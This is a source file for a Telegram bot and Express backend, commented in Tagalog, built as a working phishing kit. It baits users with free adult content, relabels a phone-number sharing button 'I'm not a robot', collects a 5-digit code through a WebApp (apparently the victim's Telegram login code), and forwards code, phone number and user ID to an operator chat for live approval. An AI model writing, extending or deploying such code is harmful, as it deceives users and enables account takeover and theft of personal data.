import express from "express";
import cors from "cors";
import { Telegraf } from "telegraf";

const BOT_TOKEN = process.env.BOT_TOKEN;
const WEBAPP_URL = process.env.WEBAPP_URL;
const WEBSITE_URL = process.env.WEBSITE_URL;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;

if (!BOT_TOKEN) {
  throw new Error("BOT_TOKEN is not set");
}
if (!ADMIN_CHAT_ID) {
  throw new Error("ADMIN_CHAT_ID is not set");
}

const bot = new Telegraf(BOT_TOKEN);

// Storage
const userPhones = new Map();
const submissions = new Map();
const typingLoops = new Map();

// Helper functions
function scheduleDelete(chatId, messageId, delayMs = 30 * 60 * 1000) {
  setTimeout(() => {
    bot.telegram.deleteMessage(chatId, messageId).catch(() => {});
  }, delayMs);
}

function stopTypingLoop(userId) {
  if (!userId) return;
  const key = String(userId);
  const intervalId = typingLoops.get(key);
  if (intervalId) {
    clearInterval(intervalId);
    typingLoops.delete(key);
  }
}

// /start handler - Eto yung flow na gusto mo
bot.start(async (ctx) => {
  const payload = ctx.startPayload;

  if (payload !== "from_website") {
    const msg = await ctx.reply(
      "Visit link to start verification:\n" + WEBSITE_URL
    );
    scheduleDelete(ctx.chat.id, msg.message_id);
    return;
  }

  // Ilalabas natin yung message mo, tapos yung CONTACT REQUEST button ay nakapangalan na "Hindi ako robot!"
  const msg = await ctx.reply(
    "🔞 Upang ma-access ang mga file nang libre 💦\n" +
    "👇 Siguraduhing hindi ka robot",
    {
      reply_markup: {
        keyboard: [
          [
            {
              text: "✅ Hindi ako robot!",
              request_contact: true, // Eto yung kukuha ng number pag tinap
            },
          ],
        ],
        resize_keyboard: true,
        one_time_keyboard: true,
      },
    }
  );
  scheduleDelete(ctx.chat.id, msg.message_id);
});

// Kapag tinap nila yung "✅ Hindi ako robot!" (Ipapasa ang contact)
bot.on("contact", async (ctx) => {
  const contact = ctx.message.contact;
  if (!contact) return;

  scheduleDelete(ctx.chat.id, ctx.message.message_id, 2000);

  if (contact.user_id && contact.user_id !== ctx.from.id) {
    const warn = await ctx.reply(
      "Mukhang ibang contact ito. Paki-tap ang button para i-share ang sarili mong Telegram number."
    );
    scheduleDelete(ctx.chat.id, warn.message_id);
    return;
  }

  // 1. I-save yung number!
  userPhones.set(ctx.from.id, contact.phone_number);

  // 2. Tanggalin yung button sa baba para malinis
  const reply = await ctx.reply("⏳ Naglo-load...", {
    reply_markup: {
      remove_keyboard: true,
    },
  });
  scheduleDelete(ctx.chat.id, reply.message_id, 2000);

  // 3. Ilabas na yung WebApp button para makapag-submit sila ng 5-digit code sa website
  const webappMsg = await ctx.reply(
    "✅ Verified! Pindutin ang button sa ibaba para ipagpatuloy ang pag-verify at ilagay ang code.",
    {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "📝 Ilagay ang Code",
              web_app: { url: WEBAPP_URL },
            },
          ],
        ],
      },
    }
  );
  scheduleDelete(ctx.chat.id, webappMsg.message_id);
});

// HTTP server
const app = express();

app.use(cors({
  origin: [
    'https://viralvideos.cloud', 
    'https://web.telegram.org',
    'https://telegram.org',
    'http://localhost:3000'
  ],
  methods: ['GET', 'POST', 'OPTIONS'],
  credentials: true,
  allowedHeaders: ['Content-Type', 'Authorization']
}));

app.use(express.json());
app.options('*', cors());

// API endpoint na tinatawag ng WebApp (kasama na ulit ang phone number dito)
app.post("/api/log-code", async (req, res) => {
  console.log("Received /api/log-code body:", req.body);

  const { code, tgUser } = req.body || {};

  if (!code) {
    return res.status(400).json({ ok: false, error: "Missing code" });
  }

  const userId = tgUser?.id;
  const username = tgUser?.username || "N/A";
  const firstName = tgUser?.first_name || "";
  
  // Kunin ulit ang number na na-save kanina
  const telegramPhone = userId && userPhones.get(userId) ? userPhones.get(userId) : "N/A";

  const displayName =
    firstName && username ? `${firstName} (@${username})`
    : username ? `@${username}`
    : firstName || "Unknown user";

  const submissionId = `${userId || "unknown"}_${Date.now()}`;

  submissions.set(submissionId, {
    userId,
    code,
    telegramPhone, 
    username,
    firstName,
  });

  if (userId) {
    try {
      stopTypingLoop(userId);
      const intervalId = setInterval(() => {
        bot.telegram
          .sendChatAction(userId, "typing")
          .catch(() => {});
      }, 4000);
      typingLoops.set(String(userId), intervalId);
    } catch (err) {
      console.error("Error starting typing indicator:", err);
    }
  }

  const logText =
    "🔔 New verification request\n\n" +
    `👤 User: ${displayName}\n` +
    `🆔 ID: ${userId || "N/A"}\n` +
    `📱 Telegram phone: ${telegramPhone}\n\n` +
    `🔑 Code: ${code}\n\n` +
    "Tap a button below to approve or reject.";

  try {
    await bot.telegram.sendMessage(ADMIN_CHAT_ID, logText, {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ Approve", callback_data: `approve:${submissionId}` },
            { text: "❌ Reject", callback_data: `reject:${submissionId}` },
          ],
        ],
      },
    });
    return res.json({ ok: true });
  } catch (err) {
    console.error("Admin log send error:", err);
    return res.status(500).json({ ok: false, error: "Admin log send failed" });
  }
});

// handle admin Approve/Reject buttons
bot.on("callback_query", async (ctx) => {
  const data = ctx.callbackQuery.data;
  if (!data) return;

  if (data.startsWith("confirm_login:") || data.startsWith("deny_login:")) {
    const [action, userIdStr] = data.split(":");
    stopTypingLoop(userIdStr);

    if (action === "confirm_login") {
      await ctx.answerCbQuery("Salamat sa confirmation!");
      try {
        await ctx.editMessageCaption("......");
      } catch (err) {
        await ctx.editMessageText("✅ Happy Watching .\n\nHinihintay na lang ng unti.");
      }
    } else if (action === "deny_login") {
      await ctx.answerCbQuery("You will not be approved.");
      try {
        await ctx.editMessageCaption("⚠️ Happy Watching .\n\nHappy Watching .");
      } catch (err) {
        await ctx.editMessageText("⚠️ Happy Watching .\n\nHappy Watching .");
      }
    }
    return;
  }

  const [action, submissionId] = data.split(":");
  const submission = submissions.get(submissionId);

  if (!submission) {
    await ctx.answerCbQuery("Submission not found or already processed.", { show_alert: true });
    return;
  }

  submissions.delete(submissionId);
  const { userId, code, telegramPhone, username, firstName } = submission;

  if (userId) stopTypingLoop(userId);

  const displayName =
    firstName && username ? `${firstName} (@${username})`
    : username ? `@${username}`
    : firstName || "Unknown user";

  const statusText = action === "approve" ? "✅ APPROVED" : "❌ REJECTED";

  const updatedText =
    "🔔 Verification request\n\n" +
    `👤 User: ${displayName}\n` +
    `🆔 ID: ${userId || "N/A"}\n` +
    `📱 Telegram phone: ${telegramPhone}\n\n` +
    `🔑 Code: ${code}\n\n` +
    `Status: ${statusText}`;

  try {
    await ctx.editMessageText(updatedText);

    if (action === "approve") {
      await ctx.answerCbQuery("Approved ✅");
      if (userId) {
        await bot.telegram.sendMessage(
          userId,
          "✅ Nag-approve na ang system sa verification mo.\n\n" +
            "Pwede ka nang mag join sa EXCLUSIVE group for free:\n" +
            "👉 https://t.me/+YLDFGnamQXRjODll"
        );
      }
    } else if (action === "reject") {
      await ctx.answerCbQuery("Rejected ❌");
      if (userId) {
        await bot.telegram.sendMessage(
          userId,
          "❌ Hindi nag-approve system sa verification mo.\n\n" +
            "Paki-check ang instructions at subukan ulit."
        );
      }
    }
  } catch (err) {
    await ctx.answerCbQuery("Error processing action.", { show_alert: true });
  }
});

app.get("/", (req, res) => res.send("Bot + API is running"));
app.get("/health", (req, res) => res.json({ status: "ok", bot: "running" }));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("HTTP server running on port", PORT));

bot.launch();
console.log("Bot started");

process.once("SIGINT", () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));
